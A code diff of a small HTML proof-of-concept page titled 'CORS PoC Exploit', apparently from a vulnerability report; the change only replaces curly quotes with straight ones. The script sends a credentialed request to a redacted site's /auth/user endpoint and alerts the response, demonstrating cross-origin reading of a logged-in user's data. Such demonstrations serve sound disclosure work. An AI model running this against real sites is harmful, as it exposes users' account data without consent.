@@ -6,10 +6,10 @@ function cors() {
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
-document.getElementById(“demo”).innerHTML = alert(this.responseText);
+document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open(“GET”, “https://redacted.com/auth/user”, true);
+xhttp.open("GET", "https://redacted.com/auth/user", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
@@ -18,8 +18,8 @@ xhttp.send();
 <body>
 <center>
 <h2>CORS PoC Exploit </h2>
-<div id=”demo”>
-<button type=”button” onclick=”cors()”>Exploit</button>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
 </div>
 </body>
 </html>
